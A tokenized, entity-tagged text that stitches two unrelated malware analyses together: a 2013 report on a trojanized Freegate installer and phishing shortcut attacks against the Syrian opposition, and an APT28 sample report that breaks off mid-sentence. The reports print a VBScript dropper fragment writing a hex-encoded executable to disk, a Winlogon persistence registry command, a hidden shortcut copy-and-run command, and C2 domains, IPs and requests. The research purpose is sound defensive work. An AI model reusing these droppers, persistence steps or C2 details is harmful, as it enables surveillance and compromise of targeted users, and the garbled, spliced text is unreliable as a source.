compiled
at
2013-06-15
22:41:31
UTC
and
has
the
following
properties
:

Number
18
–
June
2013

LegalCopyright
:
Copyright
©
2013
Assembly
Version
:
1.0.0.0
InternalName
:
  VPN-Pro.exe B_malware.drop
FileVersion
:
1.0.0.0
ProductName
:
VPN-Pro
ProductVersion
:
1.0.0.0
FileDescription
:
VPN-Pro
OriginalFilename
:
VPN-Pro.exe B_malware.drop

Similar
to
previously
observed
malware
attacks
targeting
the
Syrian
opposition
,
this
was
written
in
.NET
and
appears
to
require
the
.NET
3.5
framework
to
execute
.
5

When
VPN-Pro.exe B_malware.drop
is
run
,
the
victim
is
shown
the
Freegate  B_malware.infosteal
end-user
license
agreement
(
EULA
)
dialogue
box
.
6

Upon
agreeing
to
the
EULA
,
an
operational
copy
of
Freegate  B_malware.infosteal
proxy
is
launched
,
which
includes
a
request
to
unblock
the
firewall
.

The
copy
of
Freegate  B_malware.infosteal
launched
is
listed
as
'
Freegate  B_malware.infosteal
7.35
Professional
Edition
.
'

The
Freegate  B_malware.infosteal
software  i
begins
operating
,
and
quickly
prompts
the
user
for
an
update
.

Number
18
–
June
2013

Infection
In
addition
to
running
a
legitimate
copy
of
Freegate  B_malware.drop
7.35,7  i
the
malware B_malware.drop
installs
an
implant
.

A
fake
'
svchost.exe B_malware.drop
'
is
installed
in
the
victim's
Application
Data
directory
.

C:\Documents
and
Settings\<Username>\Application
Data\svchost.exe

Dropped
files
on
execution
of
VPN-Pro.exe  B_malware.drop
:

Number
18
–
June
2013

Number
18
–
June
2013

Examination
of
the
'
svchost.exe B_malware.drop

'
binary
shows
multiple
references
to
'
ShadowTech   B_malware.backdoor
Rat i
.
'

0000d5f0
00
53
68
61
64
6f
77
54
65
63
68
20
52
61
74
2e
|
.ShadowTech B_malware.infosteal
Rat.  i
|
0000d600
65
78
65
00
53
68
61
64
6f
77
54
65
63
68
20
52
|
exe.ShadowTech  B_malware.infosteal
R i
|
0000d610
61
74
00
3c
4d
6f
64
75
6c
65
3e
00
01
00
03
00
|
at.<Module>.....
|
<
snip
>
0000d6d0
04
00
56
61
6c
75
65
54
79
70
65
00
05
00
44
61
|
..ValueType...|Da
|
0000d6e0
74
61
00
53
68
61
64
6f
77
54
65
63
68
5f
52
61
|
ta.ShadowTech_Ra
|
0000d6f0
74
00
49
53
65
72
69
61
6c
69
7a
61
62
6c
65
00
|
t.ISerializable.
|
0000d700
53
79
73
74
65
6d
2e
52
75
6e
74
69
6d
65
2e
53
|
System.Runtime.S
|
0000d710
65
72
69
61
6c
69
7a
61
74
69
6f
6e
00
4d
79
53
|
erialization.MyS
|
0000d720
65
74
74
69
6e
67
73
00
53
68
61
64
6f
77
54
65
|
ettings.ShadowTe
|
0000d730
63
68
5f
52
61
74
2e
4d
79
00
41
70
70
6c
69
63
|
ch_Rat.My.Applic
|

Examination
of
network
traffic
also
identifies
the
implant
as
ShadowTech  B_malware.infosteal
RAT i
.

Packet
capture
on
port
1321/tcp
:
00
01
00
00
00
ff
ff
ff
ff
01
00
00
00
00
00
00
................
00
0c
02
00
00
00
45
53
68
61
64
6f
77
54
65
63
......EShadowTec
68
20
52
61
74
2c
20
56
65
72
73
69
6f
6e
3d
31
h
Rat
,
Version=1
2e
30
2e
30
2e
30
2c
20
43
75
6c
74
75
72
65
3d
.0.0.0
,
Culture=
6e
65
75
74
72
61
6c
2c
20
50
75
62
6c
69
63
4b
neutral
,
PublicK
65
79
54
6f
6b
65
6e
3d
6e
75
6c
6c
05
01
00
00
eyToken=null
....
00
13
53
68
61
64
6f
77
54
65
63
68
5f
52
61
74
..ShadowTech_Rat  B_malware.infosteal
2e
44
61
74
61
03
00
00
00
04
64
61
74
61
05
69
.Data.....data.i
6d
61
67
65
05
62
79
74
65
73
01
02
02
02
00
00
mage.bytes
......
00
06
03
00
00
00
64
31
30
32
36
32
32
30
32
31
......d102622021
46
32
30
30
33
32
34
30
33
30
30
33
36
32
44
36
F2003240300362D6
34
33
38
30
42
34
33
35
37
31
30
31
36
33
31
33
4380B43571016313
44
33
39
30
30
32
45
32
31
30
36
30
38
30
43
30
D39002E2106080C0
46
32
35
33
38
30
37
30
38
30
35
37
41
37
35
33
F25380708057A753
33
30
44
37
37
32
36
33
35
33
31
36
39
33
45
34
30D77263531693E4
34
37
45
31
35
35
38
37
38
35
43
0a
0a
0b
47E1558785C
...

ShadowTech  B_malware.backdoor
Rat i
is
a
Remote
Access
Trojan  B_malware.backdoor
which
appears
to
be
widely
available
for
download
on
both
English
and
Arabic
language
sites
.

Videos
can
be
found
on
YouTube
demonstrating
its
functionality
.

The
tool
offers
a
range
of
options
to
the
attacker
,
from
keylogging
and
remote
activation
of
the
webcam
to
file
exfiltration
.

ShadowTech  B_malware.backdoor
RAT i
control
console
:

Number
18
–
June
2013

File
Date
Countries
of
Submission
svchost.exe B_malware.drop
2013-06-15
23:08:19
UTC
Saudi
Arabia
VPN-Pro.exe B_malware.drop
2013-06-15
22:45:33
UTC
Turkey
,
Saudi
Arabia
,
Morocco

Number
18
–
June
2013

Both
VPN-Pro.exe B_malware.drop
and
svhost.exe  B_malware.drop
have
been
submitted
to
VirusTotal
:

Both
have
relatively
low
detection
rates
by
anti-virus
software
.

As
of
June
20
,
2013
,
svchost.exe B_malware.drop
was
only
detected
by
four
out
of
47
tested
anti-virus
programs
,
while
VPN-Pro.exe B_malware.drop
was
only
detected
by
five
out
of
46
.

The
svchost.exe B_malware.drop
initiates
an
outbound
connection
to
a
command
and
control
(
C2
)
server
hosted
at
thejoe.publicvm.com
.

This
domain
resolves
to
an
address
inside
Syrian
IP
space
:
31.9.48.119 B_ip.distribute 
.

inetnum
:
31.9.0.0  B_ip.distribute
-
31.9.127.255  i
netname
:
SY-ISP-TARASSUL

Number
18
–
June
2013
descr
:
Tarassul
inetnet
Service
Provider
country
:
SY

This
is
not
the
first
time
that
malicious
installer
packages
have
been
created
for
circumvention
tools
.

In
2012
,
malicious
installers
for
Green
Simurgh—a
standalone
proxy
intended
for
Iranian
users
but
also
used
by
some
Syrians—were
found
in
circulation
.

The
creators
of
Green
Simurgh
responded
by
posting
a
prominent
warning
on
their
website
highlighting
the
presence
of
these
malicious
installers
.

Last
year
,
malware
which
purported
to
be
the
Tor B_malware.drop
Browser i
Bundle  i
was
found
in
the
wild
.

It
was
found
to
be
backdoored
by
Gh0st B_malware.backdoor
RAT i
and
exfiltrated
data
to
an
IP
in
China
.

An
attack
using
a
malicious
installer
of
a
working
and
reputable
security
or
proxy
tool
is
especially
pernicious
as
it
targets
users
who
likely
recognize
the
importance
of
privacy
and
circumvention
,
and
may
believe
that
they
have
increased
their
privacy
and
security
by
installing
the
tool
.

ATTACK
2
:
A
TARGETED
CALL
TO
ARMS

In
this
campaign
,
contact
with
targets
was
initiated
through
phishing
e-mails
,
chat
messages
and
Facebook
posts
.

Although
we
became
aware
of
this
campaign
in
early
June
,
we
have
evidence
that
it
may
have
started
as
early
as
January
2013
.

We
believe
that
this
campaign
targeted—at
least
in
part—high-profile
members
of
the
Syrian
opposition
.

Interestingly
,
the
attack
included
targeting
of
at
least
one
non-public
address
associated
with
internal
opposition
communications
.

This
indicates
some
degree
of
prior
penetration
of
the
opposition—
either
through
computer
network
intrusion
or
other
intelligence
gathering
activities
.

The
potential
victim
in
this
attack
first
receives
a
message
from
an
unknown
source
,
in
this
case
,
a
Gmail
account
with
a
nondescript
name
.

Example
e-mail
:

Number
18
–
June
2013

The
e-mail
contains
text
,
an
image
(
not
shown
)
,
and
an
attachment
.

The
text
refers
to
a
video
of
Sheikh
Adnan
al-Arour—a
Sunni
pro-opposition
cleric—based
in
Saudi
Arabia
,
calling
for
holy
war
against
Assad
and
Hezbollah
.

The
user
is
led
to
believe
that
opening
the
zip
file
,
which
is
descriptively
titled
as
being
the
Sheikh's
opinion
,
will
provide
access
to
the
video
.

While
we
have
identified
multiple
different
attacks
with
different
zip
files
,
the
structure
of
all
of
these
is
consistent
with
the
example
described
here
.

Example
zip
files
:
ئلإا
ب
روعرع
لا
نا
ندع
خي
ش
لا
يأر
.zip9
يروس
لا
ين
طو
لا
فلا
ت
داهج
لا
نل
ع
ي
روعرع
لا
نا
ندع
خي
ش
لا
–
ط
بار
.zip
ةي
غامد
ةطل
ج
ب
يمي
هار
بلاا
رض
خلاا
ي
لود
لا
ثوع
ب
م
لا
ة
باص
ا
.zip
اهن
ع
يق
ي
ق
ح
لا
لوؤس
م
لاو
ق
يو
ق
ره
ن
ةرزجم
لوح
ادج
صاخ.zip

The
zip
file
extracts
to
a
Windows
Shortcut
file
with
the
same
name
and
a
.lnk
extension
.

Example
.lnk
file
'
Sample
A
'
:
خي
ش
لا
نا
ندع
روعرع
لا
فلا
ت
ئلإا
ب
ين
طو
لا
يروس
لا.lnk

Number
18
–
June
2013

Parsing
these
files
reveals
a
URL
embedded
in
the
the
file
(
bolded
below
)
.

Parsing
'
Sample
A
'
:
source
path
/
filename
:
1file
modified
:
06
/
16
/
2013
16:49:04
[
UTC
]
file
accessed
:
06
/
19
/
2013
22:00:22
[
UTC
]
file
created
:
06
/
19
/
2013
22:00:22
[
UTC
]
Target
flags
:
HasLinkTargetIDList
,
HasLinkInfo
,
HasRelativePath
,
Has
WorkingDir
,
HasArguments
,
HasIconLocation
,
IsUnicode
,
DisableLinkPathTracking
Target
attributes
:
FILE_ATTRIBUTE_ARCHIVE
Target
modified
:
07
/
17
/
2012
22:58:51.981
[
UTC
]
Target
accessed
:
07
/
17
/
2012
22:58:51.981
[
UTC
]
Target
created
:
07
/
17
/
2012
22:58:51.981
[
UTC
]
Target
ObjID
time
:
12
/
27
/
2012
10:55:02.540
[
UTC
]
File
offset
:
0x00000000
[
0
]
Parsed
size
:
0x000005b2
[
1458
bytes
]
Target
file
size
:
0x00003000
[
12288
bytes
]
Show
cmd
:
[
SW_SHOWNORMAL
]
ID
List
:
{
CLSID_MyComputer
}
\C:\Windows\System32\mshta.exe
Volume
Type
:
fixed
Volume
serial
num
:
7203-8b23
Volume
label
:
╟ß▐╤╒
╟ßπ═ßφ
:
C
Local
base
path
:
C:\Windows\System32\mshta.exe
Relative
path
:
..\..\..\Windows\System32\mshta.exe
Working
directory
:
C:\Windows\system32
Cmdline
args
:
http://[REDACTED]?url=http://www.youtube.com/watch?v=jDkluDCn7fA  B_url.normal
Icon
filename
:
%SystemRoot%\system32\SHELL32.dll
Special
Folder
ID
:
CSIDL_SYSTEM
Known
Folder
ID
:
1ac14e77-02e7-4e5d-b744-2eb1ae5198b7
NETBIOS
name
:
xp-pc
Volume
ID
:
32035a92-7032-4de3-846f-ed880ad23fa7
Object
ID
:
dd81bda8-5013-11e2-ab13-c0f8da734a02
MAC
address
:
c0:f8:da:73:4a:02
format
ID
[
value
]
:
{
b725f130-47ef-101a-a5f1-02608c9eebac
}
[
mshta.exe\╪o┘ä╪¬╪╖╪¿┘è┘é
]
format
ID
[
value
]
:
{
46588ae2-4cbc-4338-bbfc-139326986dce
}
[
S-1-5-21-13484416121947693625-1007466904-1000
]
format
ID
[
value
]
:
{
dabd30ed-0043-4789-a7f8-d013a4736622
}
[
System32▲
(
ΓÇ¬C
:
\WindowsΓÇ1⁄4
)
]
format
ID
[
value
]
:
{
28636aa6-953d-11d2-b5d6-00c04fd918d0
}
[
C:\Windows\System32\mshta.exe
]

When
the
victim
executes
the
Windows
shortcut
,
they
are
directed
to
one
of
several
malicious
links
depending
on
the
zipfile
that
they
were
sent
.

These
are
visible
in
the
link
parsing
.

Number
18
–
June
2013

Links
embedded
in
the
Windows
shortcut
:

Link
Sample
A
(
active
)
http://[REDACTED]om/g.php?url=http://www.youtube.com/watch?v=jDkluDCn7fA B_url.normal
Link
Sample
B
(
defunct
)
http://google-panel.html5.me/g.php?url=http://www.youtube.com/watch?v=Uw3Ny2A1WvQ B_url.normal
Link
Sample
C
(
defunct
)
http://forgoogle.allalla.com/u.php?url=http://www.alkalimaonline.com/news.php?id=118868 B_url.normal

The
victim
is
then
shown
either
a
YouTube
video
featuring
Sheikh
Adnan
al-Arour
,
or
a
story
on
http://www.alkalimaonline.com
,
a
Lebanese
news
site
.

Example
of
YouTube
video
shown
to
victim
:

Number
18
–
June
2013

The
Malware B_malware.backdoor
While
the
victim
sees
the
decoy
YouTube
video
or
news
website
,
a
php
file
(
g.php
)
that
contains
a
hexencoded
malicious
binary
is
fetched
.

Excerpt
from
G.php
:
10

Please
wait
..
<
script
language
=
'
javascript
'
>
document.location
=
''
;
<
/script
>
<
HTML
>
<
script
language
=
vbs
>

Set
o
=
CreateObject
(
'
Scripting.FileSystemObject
'
)
Set
s
=
CreateObject
(
'
WScript.Shell
'
)
p
=
o.GetSpecialFolder
(
2
)
&
'
\1.exe
'
t
=
split
(
'
4D,5A,90,0,3,0,0,0,4,0,0,0,FF,FF,0,0,B8,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,0,0,0,E,1F,BA,E,0,B4,
9,CD,21,B8,1,4C,CD,21,54,68,69,73,20,70,72,6F,67,72,61,6D,20,63,61,6E,6E,6F,74,2
0,62,65,20,72,75,6E,20,69,6E,20,44,4F,53,20,6D,6F,64,65,2E,D,D,A,24,0,0,0,0,0,0,
0,50,45,0,0,4C,1,3,0,44,20,B6,51,0,0,0,0,0,0,0,0,E0,0,2,1,B,1,8,0,0,CC,1,0,0,8,0

Number
18
–
June
2013

,0,0,0,0,0,3E,EA,1,0,0,20,0,0,0,0,0,0,0,0,40,0,0,20,0,
<SNIP>
<SNIP>
<SNIP>
<SNIP>
<SNIP>
<SNIP>
<SNIP>
<SNIP>

Once
extracted
,
the
binary
of
'
Sample
A
'
has
the
following
properties
:

Build
Date
[Mon
Jun
10

18:51:48
2013
UTC
]
Comments
This
installation
was
built
with
Inno
Setup
.
FileDescription
Session
Disconnection
Utility

The
malware B_malware.backdoor
also
adds
a
registry
key
to
make
it
persistent
across
reboots
:

reg
add
'
HKEY_CURRENT_USER\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon
'
/v
'
Shell
'
/d
'
C:\WINDOWS\explorer.exe
,
C:\Documents
and
Settings\user\Local
Settings\Temp\atiapfxx.exe
'
/f

The
malware B_malware.backdoor
contains
strings
referring
to
'
Data
Protector
v2
'
which
appears
to
refer
a
crypter
that
is
compatible
with
a
range
of
RATs
and
advertised
for
download
in
a
number
of
forums
.
12

C:\Users\John\Documents\Visual
Studio
2012\Projects\Data
Protector
v2\atiapfxx\atiapfxx\bin\Release\Obfuscated\atiapfxx.pdb

Command
and
Control

Once
the
malware B_malware.backdoor
is
successfully
installed
on
the
victim's
computer
,
it
communicates
with
a
C2
server
at
:
tn5.linkpc.net

On
June
11
,
this
pointed
to
the
following
SyriaTel
address
:

Domain
:
tn5.linkpc.net  B_url.cncsvr
IP
:
94.252.198.112 B_ip.cncsvr
netnum
:
94.252.192.0  B_ip.distribute
-
94.252.255.255 i
netname
:
SY-SYRIATEL-MOBILE

Number
18
–
June
2013

descr
:
Syriatel
3G
country
:
SY

This
domain
has
been
active
since
at
least
October
2012
and
has
pointed
to
many
different
addresses
in
Syrian
IP
space
on
both
the
SyriaTel
and
Tarassul
ISPs
,
as
well
as
AnchorFree
VPN
addresses
.

The
malware B_malware.backdoor
attempts
to
download
a
remote
file
called
'
123.functions B_malware.backdoor
'
:

GET
/123.functions
HTTP/1.1
Accept
:
*/*
Accept-Encoding
:
gzip
,
deflate
User-Agent
:
Mozilla
/
4.0
(
compatible
;
MSIE
7.0
;
Windows
NT
5.1
;
(
R1
1.5
)
;
.NET4.0C
;
.NET4.0E
;
.NET
CLR
1.1.4322
;
.NET
CLR
2.0.50727
;
.NET
CLR
3.0.04506.30
)
Host
:
tn5.linkpc.net:81

It
was
not
possible
to
retrieve
the
remote
file
at
the
time
of
analysis
.

CONCLUSIONS
As
the
conflict
in
Syria
drags
on
,
digital
campaigns
targeting
Syrian
opposition
have
persisted
.

We
have
chosen
to
highlight
two
attacks
that
are
part
of
recent
efforts
by
Pro-Government
Electronic
Actors
to
compromise
opposition
communications
and
steal
their
secrets
.

These
attacks
cater
to
the
opposition's
communication
behaviors
and
tactics
.

They
are
indicative
of
a
combination
of
prior
intelligence
about
the
opposition
,
and
ingenuity
in
social
engineering
.

For
example
,
many
in
the
Syrian
opposition
are
now
aware
of
the
electronic
threats
they
face
and
seek
out
tools
to
increase
their
communications
security
and
privacy
.

Tools
and
information
about
security
and
communications
are
in
constant
circulation
.

Some
of
this
material
addresses
well-defined
vulnerabilities
.

We
have
observed
a
greater
degree
of
care
among
many
in
the
opposition
when
facing
certain
situations
that
were
common
attack
modalities
in
2012
.

As
awareness
grows
and
behavior
evolves
,
we
suspect
that
some
of
the
attacks
that
we
regularly
observed
in
2012
are
much
less
successful
today
.

Some
of
the
information
and
practices
that
are
shared
between
users
,
however
,
are
much
less
appropriate
,
even
inadvertently
dangerous
.

For
example
,
many
legitimate
tools
are
shared
via
third
party
file
sharing
sites
or
over
social
media
.

This
situation
presents
a
rich
variety
of
targets
for
attackers
in
which
to
seed
malicious
binaries
and
links
masquerading
as
familiar
or
desirable
tools
.

We
infer
that
from
the
point
of
view
of
these
attackers
,
not
all
attacks
need
to
have
sophisticated
malware
in
order
to
be
successful
enough
to
be
worth
doing
.

Yet
,
perhaps
in
response
to
the
growing
awareness
of
previous
and
often
widely
targeted
attacks
against
the
Syrian
opposition
,
attackers
continue
to
innovate
and
experiment
with
new
techniques
that
blend
social
engineering
with
new
attack
styles
.

The
experiments
are
sometimes
clearly
successful
.

For
example
,
in
the
case
of
Attack
2
,
the
Windows
shortcut
files
were
not
conclusively
identified
as
malicious
by
even
savvy
opposition
members
for
an
extended
period
of
time
.

We
hope
that
this
post
will
increase
awareness
of
the
two
attacks
among
potential
targets
.

In
the
meantime
,
users
who
have
executed
either
the
fake
Freegate  B_malware.drop
file  i
or
clicked
on
one
of
the
Windows B_malware.drop
shortcut  i
files i
should
consider
their
computers
and
accounts
compromised
.

Number
18
–
June
2013

APPENDIX
:
RECOMMENDATIONS
FOR
Freegate  B_malware.infosteal
AND
Freegate  B_malware.infosteal
USERS

The
Freegate  B_malware.infosteal
website
is
blocked
in
China
(
its
primary
target
market
)
,
as
is
the
case
with
other
similar
circumvention
tools
.

To
get
around
blocking
,
tools
are
often
distributed
between
individuals
,
or
through
untrusted
downloads
from
third
party
sites
.

This
is
an
unfortunate
vector
for
attackers
to
distribute
malicious
installers
and
bundles
that
also
contain
functional
versions
of
the
program
.

As
demonstrated
by
our
work
on
the
Freegate  B_malware.backdoor
malware i
,
as
well
as
the
Green
Simurgh
case
,
these
vulnerabilities
are
exploited
with
serious
consequences
for
high-risk
users
.

We
understand
the
resource
constraints
that
developers
of
free
security
and
circumvention
software
often
face
.

As
such
,
we
propose
two
simple
steps
that
Freegate  B_malware.infosteal
could
take
to
help
mitigate
the
current
and
similar
future
threats
.


1
)
Freegate  B_malware.infosteal
should
take
steps
to
make
their
users
aware
of
the
threat
.

We
provided
Freegate  B_malware.infosteal
developers
with
details
of
the
attack
,
copies
of
the
malicious
binary
,
and
other
details
prior
to
publication
.

We
would
like
to
point
them
towards
the
example
established
by
Green
Simurgh
,
who
promptly
posted
a
multilingual
warning
to
their
website
when
a
malicious
repackaging
of
their
tool
was
found
to
be
targeting
Syrian
users
.

We
have
offered
to
help
them
translate
any
warning
materials
into
Arabic
.


2
)
Freegate  B_malware.infosteal
should
implement
by-default
HTTPS
on
their
website
.

Currently
,
visitors
to
the
Freegate  B_malware.infosteal
website
follow
non-HTTPS
links
to
an
unencrypted
download
.

We
believe
that
this
presents
a
clear
risk
for
man-in-the-middle
attacks
.

Most
developers
of
similar
anticensorship
,
circumvention
,
and
security
tools
have
implemented
this
security
measure
.

We
encourage
Freegate  B_malware.infosteal
to
follow
suit
.

ACKNOWLEDGEMENTS
Special
thanks
to
several
anonymous
Syrians
who
brought
these
malware
samples
to
our
attention
.

Additional
thanks
to
Bill
Marczak
,
Byron
Sonne
,
Adam
Senft
,
and
Ron
Deibert
.
_______________________________________

Number
18
–
June
2013

Footnotes
1
State-Sponsored
Malware
,
'
Electronic
Frontier
Foundation
,
'
https://www.eff.org/issues/state-sponsoredmalware
.
2
We
notified
Freegate  B_malware.infosteal
on
June
17
,
2013
.
3
MD5
b3e1c2e40be54fbc0f7921ea8ce807e2  B_hash
SHA1
3f6436420e84ac96d9a3c93045c07cdadda8ec81  B_hash
SHA256
3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d  B_hash
4
MD5
8eda7dfa4ec4ac975bb12d2a3186bbeb  B_hash
SHA1
b5c49bbbf7499a30110adc94480b3edbc8d6e92b  B_hash
SHA256
829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0  B_hash
5
It
failed
to
execute
with
.NET
4.0
on
Windows
XP
.
6
The
implant
is
installed
regardless
of
whether
or
not
the
victim
completes
the
Freegate  B_malware.infosteal
installation
process
.
7
The
file
fg735p.exe
matches
the
hash
of
a
legitimate
Freegate  B_malware.infosteal
installer
.
MD5
b083418be502162a4e248faab363f1b9  B_hash
SHA1
030937f008bc203198e3754b1b54bb6d8d72794b  B_hash
SHA256
d6ded89b91cdcd5d9ad4f6453f38f04f11f608d8db77db09e7400cfd7bcecddf  B_hash
8
MD5
2ba789458781b1dfd7f34624c8410edb  B_hash
SHA1
77fd62d8e630e74d637682b91d0952d48b7c52be  B_hash
SHA256
80b3fa8113a89040048a87c63ab9d8117368f2579368f5ea5999b145c47c4490  B_hash
9
MD5
59c6e0fa61d62a1f52b6092dc92a4aa7  B_hash
SHA1
fce82013dbb9261db8b14451122fa889dfdba2e0  B_hash
SHA256
71cb3e1007da3193c89a532b275cf539730b25bd63bcc5e912503ddd4bc9097f  B_hash
10
MD5
61a26c391aa95084521f5c0f6f70b966  B_hash
SHA1
bd901cf02778d5c76dfe7c2877d773baa5bae5a7  B_hash
SHA256
2c7600e0e660b0788faf5f5de3c10ac257000a557278eba41d3e7ec6175f22fb  B_hash
11
MD5
00cc589571fa6e078cb92b34ea2ee1cc  B_hash
SHA1
bfe30069998c5e4c43f98f17538678074d02ca3d  B_hash
SHA256
bcf32f82f0971c8984bb493f5473f0f417c203c0484c80a772ee1165a8c7675d  B_hash
12
For
example
,
see
:
http://undercrypter.blogspot.de/2013/03/blog-post.html
.
ZLAB

Malware
Analysis
Report

Operation
Roman
Holiday
–
Hunting
the
Russian
APT28
group

Table
of
Contents

Introduction
Discovered
Samples
'
87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef.exe B_malware.drop
'
'
15486216ab9c8b474fe8a773fc46bb37a19c6af47d5bd50f5670cd9950a7207c.exe B_malware.drop
'
'
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6.exe B_malware.drop
'
'
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914.exe B_malware.drop
'
'
sdbn.dll B_malware.drop
'
'
upnphost.exe B_malware.drop
'
The
same
malware
behind
four
executables
upnphost.exe B_malware.drop
Our
submission
to
VirusTotal
AutoIt
Script
sdbn.dll B_malware.drop
The
attack
threat
map
Yara
rules

Introduction

Recently
,
a
new
series
of
malware
samples
were
submitted
to
the
major
online
sandboxes
.

We
noticed
one
sample
submitted
to
Virus
Total
that
was
attributed
by
some
experts
to
the
Russian
APT28
group
.

APT28
group
(
aka
Fancy
Bear
,
Pawn
and
Strontium
)
has
been
active
since
at
targeted
governments
,
militaries
,
and
security
organizations
worldwide
.

Storm
,
Sednit
,
Sofacy
,
it
has
least
2007
and
The
group
was
involved
also
in
the
string
of
attacks
that
targeted
2016
Presidential
election
.

With
the
help
of
the
researcher
that
goes
online
with
the
Twitter
handle
Drunk
Binary
(
@DrunkBinary
)
we
obtained
a
collection
of
samples
to
compare
with
the
one
we
were
in
possession
to
discover
if
we
were
in
presence
of
a
new
variant
of
the
infamous
APT28 B_malware.backdoor
backdoor I
tracked
as
X-Agent B_malware.backdoor
.

The
attack
we
analyzed
is
multi-stage
,
an
initial B_malware.drop
dropper I
malware I
written
in
Delphi
programming
language
(
a
language
used
by
the
APT28
in
other
campaigns
)
downloads
a
second
stage
payload
from
internet
and
executes
it
.

The
payload
communicates
to
the
server
using
HTTPS
protocol
,
making
it
impossible
to
eavesdrop
on
the
malicious
traffic
it
generates
.

We
also
analyzed
another
malicious
DLL B_malware.backdoor
,
apparently
unrelated
to
the
previous
samples
,
that
presents
many
similarities
with
other
payloads
attributed
to
the
Russian
APT
group
.

This
malware
is
particularly
interesting
for
us
because
it
contacts
a
command
and
control
with
the
name
'
marina-info.net B_url.distribute
'
a
clear
reference
to
the
Italian
Military
corp
,
Marina
Militare
.

This
lead
us
into
speculating
that
the
malicious
code
was
developed
as
part
of
targeted
attacks
against
the
Italian
Marina
Militare
,
or
some
other
entities
associated
with
it
.

This
last
DLL B_malware.unknown
seems
to
be
completely
unconnected
with
the
previous
samples
,
but
further
investigation
leads
us
into
believing
that
it
was
an
additional
component
used
by
APT28
in
this
campaign
to
compromise
the
target
system
.

APT28
has
a
rich
arsenal
composed
of
a
large
number
of
modular
threats
and
the
dll B_malware.backdoor
is
the
component
of
the
X-Agent B_malware.backdoor
we
analyzed
.

X-Agent B_malware.backdoor
is
a
persistent
payload
injected
into
the
victim
machine
that
can
be
compiled
for
almost
any

Operating
System
and
can
be
enhanced
by
adding
new
ad-hoc
component
developed
for
the
specific
cyber-attack
.

In
our
case
,
the
component
was
submitted
to
online
sandboxes
while
the
new
campaign
was
ongoing
.

We
cannot
exclude
that
the
APT
group
developed
the
backdoor
to
target
specific
organizations
including
the
Italian
Marina
Militare
or
any
other
subcontractor
.

In
our
analysis
we
were
not
able
to
directly
connect
the
malicious
dll B_malware.backdoor
file I
to
the
X-Agent B_malware.backdoor
samples
,
but
believe
they
are
both
part
of
a
well-coordinated
surgical
attack
powered
by
APT28
.

The
dll B_malware.backdoor
that
connect
to
'
marina-info.net B_url.distribute
'
may
be
the
last
stage B_malware.backdoor
- I
malware I
that
is
triggered
only
when
particular
conditions
occur
,
for
example
when
the
malware
infects
a
system
with
an
IP
address
belonging
to
specific
ranges
.

Discovered
Samples

In
this
section
we
reports
all
the
sample
we
analyzed
in
our
investigation
.
'
87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef.exe B_malware.drop
'
MD5
dc40f11eb6815ca9adea0a3b8ce7262c B_hash
SHA-1
31875868738792a258c2b38641acf2aac1ac0352 B_hash
SHA-256
87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef B_hash
File
Size
851.07
KB
Icon

'
15486216ab9c8b474fe8a773fc46bb37a19c6af47d5bd50f5670cd9950a7207c.exe B_malware.drop
'
MD5
44d5d647016b04a095f3658260eaac72 B_hash
SHA-1
7cd1b5f6774b25727e1d80b29979dadd1d427d3a B_hash
SHA-256
15486216ab9c8b474fe8a773fc46bb37a19c6af47d5bd50f5670cd9950a7207c B_hash
File
484
KB
Icon

'
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6.exe B_malware.drop
'
MD5
687464d6c668b59f85b0e02012945fe5 B_hash
SHA-1
b3086b4d99288d50585d4c07a3fdd0970a9843fc B_hash
SHA-256
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6 B_hash
File
Size
1233
KB
Icon

'
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914.exe B_malware.drop
'
MD5
75fa78ebe2ccf42ad885c722a78399aa B_hash
SHA-1
d41aa10a53684317814c4d4397f46757fe218246 B_hash
SHA-256
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914 B_hash
File
Size
851.07
KB
Icon

'
sdbn.dll B_malware.drop
'
MD5
374896a75493a406eb427f35eec86fe5 B_hash
SHA-1
7fbf5f83f34b8a3531fb1be7eca83167648e7b21 B_hash
SHA-256
1228e9066819f115e8b2a6c1b75352566a6a5dc002d9d36a8c5b47758c9f6a45 B_hash
File
Size
294
KB

'
upnphost.exe B_malware.drop
'
MD5
edc83f5b08d3d009e60f3700d6a273da B_hash

SHA-1
8f338c7afb4346e8fe9f8db289b6fc6a03e68378 B_hash
SHA-256
d3c30cc8fb8f049ca6d448466f7440e175b53dcdf7d7e769c34693d43d858b06 B_hash
File
Size
378
KB

The
same
malware
behind
four
executables

The
first
four
executables
listed
in
the
previous
paragraph
were
used
as
infection
vectors
in
the
new
campaign
we
investigated
.

The
samples
appear
as
different
payloads
but
further
basic
static
analysis
allowed
us
to
discover
that
they
are
the
same
malware
sample
:

-
The
first
two
samples
are
identical
,
with
the
unique
difference
that
the
second
one
is
packed
using
the
UPX
tool
.

Once
unpacked
it
,
we
have
discovered
the
same
payload
with
also
the
same
hash
of
the
first
sample

-
The
third
and
the
fourth
ones
are
the
identical
too
,
also
in
this
the
difference
is
that
the
fourth
one
is
packed
using
the
UPX
tool
.

-
We
can
speculate
that
we
have
two
different
samples
,
then
we
were
able
to
extract
2
files
from
the
second
family
:
a
classic
'
.lnk
'
file
and
a
'
jpg
'
file
.

Figure
1
-
Extracted
files

These
files
seem
to
be
a
classic
img
and
a
link
,
but
actually
the
jpg
file
is
the
executable
of
the
second
sample
and
in
the
link
file
is
hidden
the
following
command
:

%systemroot%\System32\cmd.exe
/c
copy
12-033-1589(1).rar
C:\Users\Public\12-033-1589(1).exe
||
copy
12-033-1589(2).jpg
C:\Users\Public\12-033-1589(1).exe
&
start
C:\Users\Public\12-033-1589(1).exe

upnphost.exe B_malware.drop

After
executing
the
file
,
it
contacts
the
IP
'
45.124.132.127 B_ip.distribute
'
where
it
sends
periodically
some
information
gathered
on
the
operative
system
,
